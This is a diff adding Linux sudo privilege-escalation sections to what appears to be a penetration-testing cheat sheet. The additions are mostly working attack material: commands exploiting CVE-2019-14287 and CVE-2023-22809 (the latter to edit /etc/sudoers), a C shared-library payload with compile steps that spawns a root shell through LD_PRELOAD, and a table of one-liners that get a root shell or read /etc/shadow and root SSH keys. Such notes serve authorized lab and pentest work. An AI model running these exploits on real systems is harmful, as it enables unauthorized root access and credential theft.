@@ -91,3 +91,64 @@ sudo -u root PYTHONPATH="$d" PYTHONDONTWRITEBYTECODE=1 /usr/bin/python3 <SCRIPT>
 | Child command denied | `NOEXEC`, `INTERCEPT`, child path |
 | Non-root identity | That account's access and rules are a separate step |
 | Root inside a container | Not host root → [groups-and-nfs](groups-and-nfs.md) |
+
+## Sudo version bugs
+```bash
+sudo -V | head -1
+```
+Rule `(ALL, !root) /bin/bash`, sudo < 1.8.28 (CVE-2019-14287):
+```bash
+sudo -u#-1 /bin/bash
+```
+Rule with `sudoedit`, sudo 1.8.0–1.9.12p1 (CVE-2023-22809): extra `--` arguments in `EDITOR`/`VISUAL` open files outside the rule.
+```bash
+EDITOR='vim -- /etc/sudoers' sudoedit /path/allowed/by/rule
+```
+- Then add `<USER> ALL=(root) NOPASSWD: ALL`, `sudo -i`; validate with `visudo -c`. Baron Samedit (heap overflow) → [kernel-checks](kernel-checks.md#known-cve-patterns).
+
+## LD_PRELOAD kept by sudo
+Only when `sudo -l` shows `env_keep+=LD_PRELOAD` (or `LD_LIBRARY_PATH`) in the Defaults and the permitted command is dynamically linked.
+
+```c
+#include <stdlib.h>
+#include <unistd.h>
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setuid(0); setgid(0);
+    system("/bin/bash -p");
+}
+```
+```bash
+gcc -fPIC -shared -nostartfiles -o /tmp/pe.so /tmp/pe.c
+sudo LD_PRELOAD=/tmp/pe.so <ALLOWED-COMMAND>
+```
+- Without `env_keep`, `env_reset` drops the variable and this fails. The rule must allow some dynamically linked command; the library runs inside that root process. `LD_LIBRARY_PATH` variant: `ldd <BINARY>`, plant a same-named library in your directory.
+
+## Common sudo / GTFOBins one-liners (offline)
+Run as the user the rule names (`sudo -u <RUNAS> ...`). Confirm the binary's exact path and allowed arguments first, and look up anything missing from this list on GTFOBins.
+
+| Binary | Shell |
+| --- | --- |
+| `vi` / `vim` | `sudo vim -c ':!/bin/sh'` |
+| `less` / `more` / `man` / `journalctl` | open anything, then type `!/bin/sh` |
+| `nano` | `^R` `^X`, then `reset; sh 1>&0 2>&0` |
+| `awk` | `sudo awk 'BEGIN {system("/bin/sh")}'` |
+| `perl` | `sudo perl -e 'exec "/bin/sh";'` |
+| `php` / `ruby` / `lua` / `node` | `sudo php -r 'system("/bin/sh");'` / `sudo ruby -e 'exec "/bin/sh"'` / `sudo lua -e 'os.execute("/bin/sh")'` / `sudo node -e 'require("child_process").spawn("/bin/sh",{stdio:[0,1,2]})'` |
+| `env` | `sudo env /bin/sh` |
+| `git` | `sudo git -p help config`, then `!/bin/sh` |
+| `gdb` | `sudo gdb -nx -ex '!sh' -ex quit` |
+| `ftp` | `sudo ftp`, then `!/bin/sh` |
+| `mysql` | `sudo mysql -e '\! /bin/sh'` |
+| `ssh` | `sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x` |
+| `rsync` | `sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null` |
+| `tar` | `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` |
+| `zip` | `sudo zip /tmp/x.zip /etc/hosts -T -TT 'sh #'` |
+| `apt-get` / `apt` | `sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh` |
+| `nmap` (new) | `echo 'os.execute("/bin/sh")' > /tmp/x.nse; sudo nmap --script=/tmp/x.nse` |
+| `nmap` (2.02–5.21) | `sudo nmap --interactive`, then `!sh` |
+| `cp` / `tee` / `dd` / `wget` / `curl` | file write as root → [file-write](file-write.md) (sudoers, passwd, authorized_keys) |
+| `cat` / `head` / `tail` / `base64` | file read as root: `/etc/shadow`, `/root/.ssh/id_rsa`, `proof.txt` is not a shell |
+
+- Pager-based rows need a real terminal: [stabilize the shell](../foothold/shells.md#stabilize-a-linux-tty) first (`!sh` inside `less` fails without a TTY).
+- Turn a read/write primitive into a shell (key, sudoers entry, `/etc/passwd` record) before taking the proof screenshot.
